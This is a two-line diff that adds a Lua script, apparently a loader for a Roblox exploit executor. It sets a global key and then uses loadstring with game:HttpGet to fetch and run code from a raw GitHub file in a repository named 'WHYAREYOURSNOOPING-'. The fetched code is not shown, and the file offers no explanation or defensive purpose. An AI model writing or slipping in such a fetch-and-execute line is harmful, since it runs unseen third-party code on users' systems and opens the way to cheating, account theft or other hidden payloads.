@@ -1,0 +1,2 @@
+_G.Key = "xPGWKSRmxYIp2r5GcqYbrgcHv8kBOo"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tatbyYT/WHYAREYOURSNOOPING-/main/SnoopingMuch%3F'))()
